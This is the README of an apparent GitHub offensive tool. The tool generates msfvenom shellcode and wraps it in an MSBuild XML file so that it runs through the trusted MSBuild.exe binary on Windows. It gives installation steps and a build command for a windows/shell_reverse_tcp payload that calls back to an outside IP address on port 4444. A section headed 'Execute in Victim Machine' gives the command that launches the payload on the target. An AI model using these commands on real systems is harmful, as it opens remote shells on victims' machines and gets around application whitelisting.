# MSBuild ShellCode Runner

**Credits:**
Thanks to [ired.team](https://www.ired.team/) for publishing an article using msbuild to run C#. I just made this to automate the process of shellcode creation from `msfvenom`

[https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c](https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c)

## Installation
Install the metasploit framework first before using this

```bash
git clone https://github.com/jmrcsnchz/msbuild-shellcode.git
```
```bash
pip3 install argparse
```
```bash
cd msbuild-shellcode
```
```bash
python3 build.py -h

usage: build.py [-h] -x PAYLOAD -l LHOST -p LPORT [-a ARCH]
build.py: error: the following arguments are required: -x/--payload, -l/--lhost, -p/--lport
```

## Usage



```bash
python3 build.py -a x86 -x windows/shell_reverse_tcp -l 130.205.34.70 -p 4444
```
![](https://i.ibb.co/mS9zJFJ/Untitled.png)
## Execute in Victim Machine
```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\random\path\bad.xml
```

## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Please make sure to update tests as appropriate.
